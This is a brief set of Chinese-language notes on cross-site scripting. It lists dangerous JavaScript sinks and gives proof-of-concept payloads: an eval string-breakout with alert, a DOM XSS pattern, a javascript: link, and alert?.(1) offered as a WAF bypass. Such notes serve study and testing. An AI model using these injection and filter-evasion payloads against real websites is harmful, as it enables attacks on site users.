```JavaScript
eval("console.log('"+"')-alert()//"+"')");
注释只会注释当前部分，不会全部注释掉，就是最后一个双引号之前的会注释掉
```
危险函数：settimeout，eval，location，innerhtml等

```
var name = '1' -alert(1)
典型的domxss
```

```
<a href=javascript:alert%28%29>test</a>
```

```
alert?.(1)
可以绕waf
```

客户端